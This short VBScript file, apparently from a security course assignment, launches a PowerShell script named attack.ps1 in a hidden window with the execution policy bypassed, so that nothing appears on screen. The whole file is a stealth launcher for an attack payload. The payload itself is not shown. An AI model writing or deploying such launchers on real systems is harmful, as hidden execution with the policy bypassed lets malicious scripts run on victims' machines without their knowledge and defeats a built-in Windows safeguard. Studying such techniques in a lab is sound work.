Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File INF8108_TP01\attack.ps1", 0
Set objShell = Nothing
